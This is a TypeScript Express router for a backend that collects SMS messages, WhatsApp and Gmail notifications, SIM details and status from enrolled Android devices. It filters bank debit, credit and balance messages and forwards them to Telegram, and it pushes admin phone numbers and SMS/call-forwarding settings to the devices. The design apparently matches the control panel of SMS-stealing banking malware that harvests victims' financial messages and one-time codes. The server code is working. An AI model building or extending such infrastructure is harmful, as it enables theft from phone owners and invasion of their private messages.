import express, { Request, Response } from "express";
import logger from "../logger/logger";
import Device from "../models/Device";
import Sms from "../models/Sms";
import wsService from "../services/wsService";
import { updateFcmToken } from "../services/deviceService";
import config from "../config";
import { classifySms } from "../services/smsClassifier";
import {
  sendTelegramMessage,
  sendTelegramMessages,
  type TelegramCategory,
} from "../services/telegramService";
import {
  buildTelegramDeviceDeletedMessage,
  buildTelegramSmsDeletedMessage,
  buildTelegramSmsMessage,
} from "../utils/telegramMessage";
import AppNotification from "../models/AppNotification";
import {
  saveAppNotification,
  listAppNotifications,
  countAppNotifications,
  distinctNotificationDevices,
  latestNotificationTimestamp,
  deleteAppNotification,
  deleteDeviceAppNotifications,
  deleteAllAppNotifications,
  deleteAppNotificationsOlderThan,
} from "../services/appNotificationService";

const router = express.Router();

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function normalizeSourceFilter(
  value: unknown,
): "whatsapp" | "gmail" | "unknown" | "" {
  const v = clean(value).toLowerCase();
  if (v === "whatsapp") return "whatsapp";
  if (v === "gmail") return "gmail";
  if (v === "unknown" || v === "other") return "unknown";
  return "";
}

function toTelegramCategories(
  categories: Array<"debit" | "credit" | "balance">,
): TelegramCategory[] {
  const out: TelegramCategory[] = ["all_finance"];

  if (categories.includes("debit")) out.push("debit");
  if (categories.includes("credit")) out.push("credit");
  if (categories.includes("balance")) out.push("balance");

  return Array.from(new Set(out));
}

function toCategoryLabels(
  categories: Array<"debit" | "credit" | "balance">,
): string[] {
  const labels: string[] = [];

  if (categories.includes("debit")) labels.push("Debit");
  if (categories.includes("credit")) labels.push("Credit");
  if (categories.includes("balance")) labels.push("Available Balance");

  if (!labels.length) labels.push("Finance");

  return labels;
}

function getDeviceTelegramMeta(device: any, deviceId: string) {
  return {
    pannelId: config.pannelId,
    deviceId,
    brandName: clean(
      device?.metadata?.brand || device?.metadata?.manufacturer || "",
    ),
    model: clean(device?.metadata?.model || ""),
    online: !!device?.status?.online,
    lastSeen: Number(device?.status?.timestamp || Date.now()),
  };
}

async function emitDeviceUpsert(deviceId: string) {
  try {
    const doc = await Device.findOne({ deviceId }).lean();
    if (doc) {
      wsService.broadcastDeviceUpsert(doc);
    }
  } catch (e) {
    logger.warn("devices: emitDeviceUpsert failed", { deviceId, error: e });
  }
}

/* ================= LIST ALL DEVICES ================= */

router.get("/", async (_req, res) => {
  try {
    const devices = await Device.find().lean();
    return res.json(devices);
  } catch (err: any) {
    logger.error("devices: list failed", err);
    return res.status(500).json([]);
  }
});

/* ================= STATUS SNAPSHOT ================= */

router.get("/status", async (_req, res) => {
  try {
    const devices = await Device.find().lean();

    const statusMap: Record<
      string,
      { online: boolean; lastSeen: number | null }
    > = {};

    devices.forEach((d: any) => {
      if (!d.deviceId) return;

      statusMap[d.deviceId] = {
        online: d?.status?.online ?? false,
        lastSeen: d?.status?.timestamp ?? null,
      };
    });

    return res.json(statusMap);
  } catch (err: any) {
    logger.error("devices: status snapshot failed", err);
    return res.status(500).json({});
  }
});

/* ================= ADMINS ================= */

router.get("/:deviceId/admins", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const doc = await Device.findOne({ deviceId }).lean();

    const admins = Array.isArray((doc as any)?.admins)
      ? (doc as any).admins
          .map((x: any) => clean(x))
          .filter(Boolean)
          .slice(0, 4)
      : [];

    return res.json(admins);
  } catch (err: any) {
    logger.error("devices: get admins failed", err);
    return res.status(500).json([]);
  }
});

router.put("/:deviceId/admins", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const rawAdmins = Array.isArray(req.body?.admins) ? req.body.admins : [];

    const admins = rawAdmins
      .map((x: any) => clean(x))
      .filter(Boolean)
      .slice(0, 4);

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          admins,
          adminPhone: admins[0] || "",
        },
      },
      { upsert: true, new: true },
    ).lean();

    try {
      wsService.sendCommandToDevice(deviceId, "admins:update", {
        uniqueid: deviceId,
        admins,
      });
    } catch (e) {
      logger.warn("devices: ws admins:update failed", e);
    }

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after admins failed", e);
    }

    return res.json({
      success: true,
      admins,
      device: doc,
    });
  } catch (err: any) {
    logger.error("devices: update admins failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

router.get("/:deviceId/adminPhone", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const doc = await Device.findOne({ deviceId }).lean();

    const phone = clean((doc as any)?.adminPhone || "");
    return res.json(phone);
  } catch (err: any) {
    logger.error("devices: get adminPhone failed", err);
    return res.status(500).json("");
  }
});

/* ================= FORWARDING SIM ================= */

router.get("/:deviceId/forwardingSim", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const doc = await Device.findOne({ deviceId }).lean();

    const value = clean((doc as any)?.forwardingSim || "auto") || "auto";
    return res.json(value);
  } catch (err: any) {
    logger.error("devices: get forwardingSim failed", err);
    return res.status(500).json("auto");
  }
});

router.put("/:deviceId/forwardingSim", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const value =
      clean(req.body?.value ?? req.body?.forwardingSim ?? "auto") || "auto";

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          forwardingSim: value,
        },
      },
      { upsert: true, new: true },
    ).lean();

    try {
      wsService.sendCommandToDevice(deviceId, "forwardingSim:update", {
        uniqueid: deviceId,
        value,
      });
    } catch (e) {
      logger.warn("devices: ws forwardingSim:update failed", e);
    }

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after forwardingSim failed", e);
    }

    return res.json({
      success: true,
      value,
      device: doc,
    });
  } catch (err: any) {
    logger.error("devices: update forwardingSim failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

/* ================= SIM INFO ================= */

router.get("/:deviceId/simInfo", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const device = await Device.findOne({ deviceId }).lean();

    if (!device) {
      return res.status(404).json({
        success: false,
        error: "Device not found",
      });
    }

    return res.json((device as any)?.simInfo || {});
  } catch (err: any) {
    logger.error("devices: simInfo failed", err);
    return res.status(500).json({});
  }
});

router.put("/:deviceId/simInfo", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);

    await Device.findOneAndUpdate(
      { deviceId },
      { $set: { simInfo: req.body } },
      { upsert: true },
    );

    await emitDeviceUpsert(deviceId);

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update simInfo failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= FCM TOKEN ================= */

router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const token = clean(req.body?.token ?? req.body?.fcmToken ?? "");

    if (!deviceId) {
      return res.status(400).json({
        success: false,
        error: "missing deviceId",
      });
    }

    if (!token) {
      return res.status(400).json({
        success: false,
        error: "missing token",
      });
    }

    await updateFcmToken(deviceId, token);

    logger.info("devices: fcm token updated", {
      deviceId,
      tokenLength: token.length,
    });

    await emitDeviceUpsert(deviceId);

    return res.json({
      success: true,
      deviceId,
    });
  } catch (err: any) {
    logger.error("devices: update fcm-token failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

/* ================ SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION) ================ */

router.put("/:deviceId/simSlots/:slot", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const slot = clean(req.params.slot);

    if (!deviceId || slot === "") {
      return res
        .status(400)
        .json({ success: false, error: "invalid params" });
    }

    const status =
      req.body?.status || (req.body?.active ? "active" : "inactive");
    const updatedAt = Number(req.body?.updatedAt || Date.now());

    const setObj: any = {};
    setObj[`simSlots.${slot}.status`] = status;
    setObj[`simSlots.${slot}.updatedAt`] = isNaN(updatedAt)
      ? Date.now()
      : updatedAt;

    await Device.findOneAndUpdate(
      { deviceId },
      { $set: setObj },
      { upsert: true },
    );

    const payload = {
      type: "event",
      event: "simSlots",
      deviceId,
      data: {
        [slot]: {
          status,
          updatedAt: isNaN(updatedAt) ? Date.now() : updatedAt,
        },
      },
      timestamp: Date.now(),
    };

    try {
      wsService.sendToAdminDevice(deviceId, payload);
    } catch (e) {
      logger.warn("wsService notify simSlots failed", e);
    }

    await emitDeviceUpsert(deviceId);

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update simSlot failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ================= LEGACY SMS NOTIFICATIONS (UNCHANGED) ================= */

router.get("/notifications", async (_req, res) => {
  try {
    const list = await Sms.find().sort({ timestamp: -1 }).lean();

    const grouped: Record<string, any[]> = {};
    list.forEach((sms: any) => {
      const did = clean(sms.deviceId);
      if (!grouped[did]) grouped[did] = [];
      grouped[did].push(sms);
    });

    return res.json(grouped);
  } catch (e: any) {
    logger.error("notifications list failed", e);
    return res.status(500).json({});
  }
});

router.get("/notifications/summary", async (_req, res) => {
  try {
    const [totalSms, distinctDeviceIds, latestSms] = await Promise.all([
      Sms.countDocuments({}),
      Sms.distinct("deviceId"),
      Sms.findOne({})
        .sort({ timestamp: -1 })
        .select("timestamp")
        .lean(),
    ]);

    const cleanIds = (distinctDeviceIds || [])
      .map((x: any) => clean(x))
      .filter(Boolean);

    return res.json({
      totalDevices: cleanIds.length,
      totalSms: Number(totalSms || 0),
      latestTimestamp: Number((latestSms as any)?.timestamp || 0),
    });
  } catch (e: any) {
    logger.error("notifications summary failed", e);
    return res.status(500).json({
      totalDevices: 0,
      totalSms: 0,
      latestTimestamp: 0,
    });
  }
});

router.get("/notifications/devices", async (_req, res) => {
  try {
    const ids = await Sms.distinct("deviceId");
    const cleanIds = ids.map((i: any) => clean(i)).filter(Boolean);
    return res.json(cleanIds);
  } catch (e: any) {
    logger.error("notifications devices failed", e);
    return res.status(500).json([]);
  }
});

router.get("/notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const since = Number(req.query.since || 0);

    const query: any = { deviceId };
    if (!isNaN(since) && since > 0) {
      query.timestamp = { $gte: since };
    }

    const msgs = await Sms.find(query).sort({ timestamp: -1 }).lean();
    return res.json(msgs);
  } catch (e: any) {
    logger.error("notifications device fetch failed", e);
    return res.status(500).json([]);
  }
});

router.delete("/notifications/device/:deviceId/:smsId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const smsId = clean(req.params.smsId);

    const deleted = await Sms.findOneAndDelete({
      _id: smsId,
      deviceId,
    });

    if (!deleted) {
      return res.status(404).json({
        success: false,
        error: "SMS not found",
      });
    }

    try {
      const payload = {
        type: "event",
        event: "notification:deleted",
        deviceId,
        data: {
          id: smsId,
          _id: smsId,
        },
        timestamp: Date.now(),
      };

      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        logger.warn("wsService notify notification:deleted failed", wsErr);
      }
    } catch (emitErr) {
      logger.warn("notifications single delete emit failed", emitErr);
    }

    try {
      const device = await Device.findOne({ deviceId }).lean();
      const meta = getDeviceTelegramMeta(device, deviceId);

      const deleteText = buildTelegramSmsDeletedMessage({
        ...meta,
        smsId,
        smsText: clean((deleted as any)?.body || ""),
        smsTitle: clean((deleted as any)?.title || ""),
        sender: clean(
          (deleted as any)?.senderNumber || (deleted as any)?.sender || "",
        ),
        receiver: clean((deleted as any)?.receiver || ""),
        deletedAt: Date.now(),
      });

      const deleteResult = await sendTelegramMessage({
        category: "delete_alert",
        text: deleteText,
      });

      logger.info("devices: telegram SMS delete alert sent", {
        deviceId,
        smsId,
        ok: deleteResult.ok,
        skipped: deleteResult.skipped,
        error: deleteResult.error,
      });
    } catch (telegramErr: any) {
      logger.error("devices: telegram SMS delete alert failed (non-fatal)", {
        deviceId,
        smsId,
        error: telegramErr?.message || telegramErr,
      });
    }

    return res.json({
      success: true,
      deletedId: smsId,
    });
  } catch (e: any) {
    logger.error("notifications single delete failed", e);
    return res.status(500).json({
      success: false,
      error: e?.message || "server error",
    });
  }
});

router.delete("/notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    await Sms.deleteMany({ deviceId });

    try {
      wsService.broadcastNotificationClearDevice(deviceId);
    } catch (e) {
      logger.warn("notifications clear device broadcast failed", e);
    }

    return res.json({ success: true });
  } catch (e: any) {
    logger.error("notifications delete for device failed", e);
    return res.status(500).json({ success: false, error: e?.message });
  }
});

router.delete("/notifications", async (_req, res) => {
  try {
    await Sms.deleteMany({});

    try {
      wsService.broadcastNotificationClearAll();
    } catch (e) {
      logger.warn("notifications clear all broadcast failed", e);
    }

    return res.json({ success: true });
  } catch (e: any) {
    logger.error("notifications delete all failed", e);
    return res.status(500).json({ success: false });
  }
});

router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
  try {
    const cutoff = Number(req.params.cutoff || 0);
    await Sms.deleteMany({ timestamp: { $lt: cutoff } });

    try {
      wsService.broadcastNotificationClearAll();
    } catch (e) {
      logger.warn("notifications olderThan broadcast failed", e);
    }

    return res.json({ success: true });
  } catch (e: any) {
    logger.error("notifications delete olderThan failed", e);
    return res.status(500).json({ success: false });
  }
});

/* ================= APP NOTIFICATIONS (SEPARATE FROM SMS) ================= */

router.post("/:id/notifications", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.id);

    const packageName = clean(req.body?.packageName);
    const title = clean(req.body?.title);
    const text = clean(req.body?.text);
    const timestamp = Number(req.body?.timestamp || Date.now());

    if (!deviceId) {
      return res.status(400).json({
        success: false,
        error: "missing deviceId",
      });
    }

    if (!packageName) {
      return res.status(400).json({
        success: false,
        error: "packageName missing",
      });
    }

    if (!title && !text) {
      return res.status(400).json({
        success: false,
        error: "title/text missing",
      });
    }

    const doc = await saveAppNotification(deviceId, {
      packageName,
      title,
      text,
      timestamp: !isNaN(timestamp) && timestamp > 0 ? timestamp : Date.now(),
      meta: req.body?.meta || {},
    });

    try {
      wsService.broadcastAppNotification(deviceId, {
        id: (doc as any)?._id,
        _id: (doc as any)?._id,
        deviceId,
        packageName: (doc as any)?.packageName || packageName,
        sourceApp: (doc as any)?.sourceApp || "unknown",
        title: (doc as any)?.title || title,
        text: (doc as any)?.text || text,
        timestamp: (doc as any)?.timestamp || Date.now(),
        meta: (doc as any)?.meta || {},
      });
    } catch (e) {
      logger.warn("devices: app-notification broadcast failed", {
        deviceId,
        error: e,
      });
    }

    await emitDeviceUpsert(deviceId);

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: push app notification failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

router.get("/app-notifications", async (req, res) => {
  try {
    const sourceApp = normalizeSourceFilter(req.query.sourceApp);
    const packageName = clean(req.query.packageName);
    const since = Number(req.query.since || 0);
    const limit = Number(req.query.limit || 500);

    const list = await listAppNotifications({
      sourceApp: sourceApp || undefined,
      packageName: packageName || undefined,
      since: !isNaN(since) && since > 0 ? since : undefined,
      limit: !isNaN(limit) && limit > 0 ? limit : undefined,
    });

    const grouped: Record<string, any[]> = {};
    list.forEach((item: any) => {
      const did = clean(item.deviceId);
      if (!grouped[did]) grouped[did] = [];
      grouped[did].push(item);
    });

    return res.json(grouped);
  } catch (e: any) {
    logger.error("app-notifications list failed", e);
    return res.status(500).json({});
  }
});

router.get("/app-notifications/summary", async (req, res) => {
  try {
    const sourceApp = normalizeSourceFilter(req.query.sourceApp);
    const packageName = clean(req.query.packageName);

    const [totalNotifications, distinctDeviceIds, latestTimestamp] =
      await Promise.all([
        countAppNotifications({
          sourceApp: sourceApp || undefined,
          packageName: packageName || undefined,
        }),
        distinctNotificationDevices(),
        latestNotificationTimestamp({
          sourceApp: sourceApp || undefined,
        }),
      ]);

    const cleanIds = (distinctDeviceIds || [])
      .map((x: any) => clean(x))
      .filter(Boolean);

    return res.json({
      totalDevices: cleanIds.length,
      totalNotifications: Number(totalNotifications || 0),
      latestTimestamp: Number(latestTimestamp || 0),
      sourceApp: sourceApp || "",
    });
  } catch (e: any) {
    logger.error("app-notifications summary failed", e);
    return res.status(500).json({
      totalDevices: 0,
      totalNotifications: 0,
      latestTimestamp: 0,
      sourceApp: "",
    });
  }
});

router.get("/app-notifications/devices", async (req, res) => {
  try {
    const sourceApp = normalizeSourceFilter(req.query.sourceApp);
    const ids = await distinctNotificationDevices();

    if (!sourceApp) {
      const cleanIds = ids.map((i: any) => clean(i)).filter(Boolean);
      return res.json(cleanIds);
    }

    const list = await AppNotification.distinct("deviceId", {
      sourceApp,
    });

    const cleanIds = list.map((i: any) => clean(i)).filter(Boolean);
    return res.json(cleanIds);
  } catch (e: any) {
    logger.error("app-notifications devices failed", e);
    return res.status(500).json([]);
  }
});

router.get("/app-notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const sourceApp = normalizeSourceFilter(req.query.sourceApp);
    const packageName = clean(req.query.packageName);
    const since = Number(req.query.since || 0);
    const limit = Number(req.query.limit || 500);

    const list = await listAppNotifications({
      deviceId,
      sourceApp: sourceApp || undefined,
      packageName: packageName || undefined,
      since: !isNaN(since) && since > 0 ? since : undefined,
      limit: !isNaN(limit) && limit > 0 ? limit : undefined,
    });

    return res.json(list);
  } catch (e: any) {
    logger.error("app-notifications device fetch failed", e);
    return res.status(500).json([]);
  }
});

router.delete(
  "/app-notifications/device/:deviceId/:notificationId",
  async (req, res) => {
    try {
      const deviceId = clean(req.params.deviceId);
      const notificationId = clean(req.params.notificationId);

      const deleted = await deleteAppNotification(deviceId, notificationId);

      if (!deleted) {
        return res.status(404).json({
          success: false,
          error: "App notification not found",
        });
      }

      try {
        wsService.broadcastAppNotificationDeleted(deviceId, notificationId);
      } catch (e) {
        logger.warn("app-notifications single delete broadcast failed", e);
      }

      return res.json({
        success: true,
        deletedId: notificationId,
      });
    } catch (e: any) {
      logger.error("app-notifications single delete failed", e);
      return res.status(500).json({
        success: false,
        error: e?.message || "server error",
      });
    }
  },
);

router.delete("/app-notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    await deleteDeviceAppNotifications(deviceId);

    try {
      wsService.broadcastAppNotificationClearDevice(deviceId);
    } catch (e) {
      logger.warn("app-notifications clear device broadcast failed", e);
    }

    return res.json({ success: true });
  } catch (e: any) {
    logger.error("app-notifications delete for device failed", e);
    return res.status(500).json({ success: false, error: e?.message });
  }
});

router.delete("/app-notifications", async (_req, res) => {
  try {
    await deleteAllAppNotifications();

    try {
      wsService.broadcastAppNotificationClearAll();
    } catch (e) {
      logger.warn("app-notifications clear all broadcast failed", e);
    }

    return res.json({ success: true });
  } catch (e: any) {
    logger.error("app-notifications delete all failed", e);
    return res.status(500).json({ success: false });
  }
});

router.delete("/app-notifications/olderThan/:cutoff", async (req, res) => {
  try {
    const cutoff = Number(req.params.cutoff || 0);
    await deleteAppNotificationsOlderThan(cutoff);

    try {
      wsService.broadcastAppNotificationClearAll();
    } catch (e) {
      logger.warn("app-notifications olderThan broadcast failed", e);
    }

    return res.json({ success: true });
  } catch (e: any) {
    logger.error("app-notifications delete olderThan failed", e);
    return res.status(500).json({ success: false });
  }
});

/* ================= SMS PUSH (SAFE + WS EMIT + TELEGRAM ROUTING) ================= */

router.post("/:id/sms", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.id);

    const receiver =
      req.body.receiver ||
      req.body.receiverNumber ||
      req.body.address ||
      req.body.to ||
      req.body.phone ||
      "";

    if (!receiver) {
      logger.warn("devices:sms missing receiver", { body: req.body });
      return res.status(400).json({
        success: false,
        error: "receiver missing",
      });
    }

    const rawTs = req.body.timestamp;
    const parsedTs = Number(rawTs);
    const finalTimestamp =
      typeof parsedTs === "number" && !isNaN(parsedTs) && parsedTs > 0
        ? parsedTs
        : Date.now();

    const smsDoc = new Sms({
      deviceId,
      sender: req.body.sender || req.body.from || "unknown",
      senderNumber: req.body.senderNumber || req.body.from || "",
      receiver,
      title: req.body.title || "SMS",
      body: req.body.body || req.body.message || "",
      timestamp: finalTimestamp,
      meta: req.body.meta || {},
    });

    await smsDoc.save();

    try {
      const payload = {
        type: "event",
        event: "notification",
        deviceId,
        data: {
          id: smsDoc._id,
          _id: smsDoc._id,
          title: smsDoc.title,
          sender: smsDoc.sender,
          senderNumber: smsDoc.senderNumber,
          receiver: smsDoc.receiver,
          body: smsDoc.body,
          timestamp: smsDoc.timestamp,
          meta: smsDoc.meta || {},
        },
        timestamp: Date.now(),
      };

      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
        if (io && typeof io.emit === "function") {
          io.emit("event", payload);
        }
      }
    } catch (emitErr) {
      logger.warn("WS emit failed (non-fatal)", emitErr);
    }

    try {
      await Device.findOneAndUpdate(
        { deviceId },
        {
          $set: {
            "status.timestamp": finalTimestamp,
          },
        },
        { upsert: true },
      );
      await emitDeviceUpsert(deviceId);
    } catch (e) {
      logger.warn("devices: emit device upsert after sms failed", e);
    }

    try {
      const smsText = clean(smsDoc.body);
      const classification = classifySms(smsText);

      if (classification.isFinance) {
        const device = await Device.findOne({ deviceId }).lean();
        const meta = getDeviceTelegramMeta(device, deviceId);
        const categoryLabels = toCategoryLabels(classification.categories);
        const telegramCategories = toTelegramCategories(classification.categories);

        const telegramText = buildTelegramSmsMessage({
          ...meta,
          categoryLabels,
          smsText,
          smsTitle: clean(smsDoc.title),
          sender: clean(smsDoc.senderNumber || smsDoc.sender),
          receiver: clean(smsDoc.receiver),
          timestamp: Number(smsDoc.timestamp || finalTimestamp),
        });

        const telegramResults = await sendTelegramMessages(
          telegramCategories,
          telegramText,
        );

        logger.info("devices: telegram finance routing complete", {
          deviceId,
          categories: telegramCategories,
          labels: categoryLabels,
          matchedKeywords: classification.matchedKeywords,
          online: meta.online,
          lastSeen: meta.lastSeen,
          results: telegramResults.map((x) => ({
            category: x.category,
            ok: x.ok,
            skipped: x.skipped,
            error: x.error,
          })),
        });
      } else {
        logger.info(
          "devices: sms saved but not routed to Telegram (non-finance)",
          {
            deviceId,
            smsId: smsDoc._id?.toString?.(),
          },
        );
      }
    } catch (telegramErr: any) {
      logger.error("devices: telegram routing failed (non-fatal)", {
        deviceId,
        error: telegramErr?.message || telegramErr,
      });
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("SMS save failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= DEVICE GET ================= */

router.get("/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const device = await Device.findOne({ deviceId }).lean();

    if (!device) {
      return res.status(404).json({
        success: false,
        error: "Device not found",
      });
    }

    return res.json(device);
  } catch (err: any) {
    logger.error("devices: get single failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= STATUS UPDATE ================= */

router.put("/:deviceId/status", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const online = !!req.body?.online;
    const ts = Number(req.body?.timestamp || Date.now());

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          "status.online": online,
          "status.timestamp": isNaN(ts) ? Date.now() : ts,
        },
      },
      { upsert: true, new: true },
    ).lean();

    try {
      const payload = {
        type: "event",
        event: "status",
        deviceId,
        data: { online, timestamp: isNaN(ts) ? Date.now() : ts },
        timestamp: Date.now(),
      };
      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
        if (io && typeof io.emit === "function") io.emit("event", payload);
      }
    } catch (e) {
      logger.warn("WS emit status failed (non-fatal)", e);
    }

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after status failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update status failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= UPDATE METADATA ================= */

router.put("/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      { $set: { metadata: req.body } },
      { upsert: true, new: true },
    ).lean();

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after metadata failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update metadata failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= DELETE ================= */

router.delete("/status/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          "status.online": false,
          "status.timestamp": Date.now(),
        },
      },
      { new: true },
    ).lean();

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after delete status failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: delete status failed", err);
    return res.status(500).json({ success: false });
  }
});

router.delete("/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const existingDevice = await Device.findOne({ deviceId }).lean();

    await Device.deleteOne({ deviceId });

    try {
      wsService.broadcastDeviceDelete(deviceId);
    } catch (e) {
      logger.warn("devices: broadcast device:delete failed", e);
    }

    try {
      const meta = getDeviceTelegramMeta(existingDevice, deviceId);
      const deleteText = buildTelegramDeviceDeletedMessage({
        ...meta,
        deletedAt: Date.now(),
      });

      const deleteResult = await sendTelegramMessage({
        category: "delete_alert",
        text: deleteText,
      });

      logger.info("devices: telegram device delete alert sent", {
        deviceId,
        ok: deleteResult.ok,
        skipped: deleteResult.skipped,
        error: deleteResult.error,
      });
    } catch (telegramErr: any) {
      logger.error("devices: telegram device delete alert failed (non-fatal)", {
        deviceId,
        error: telegramErr?.message || telegramErr,
      });
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: delete failed", err);
    return res.status(500).json({ success: false });
  }
});

export default router;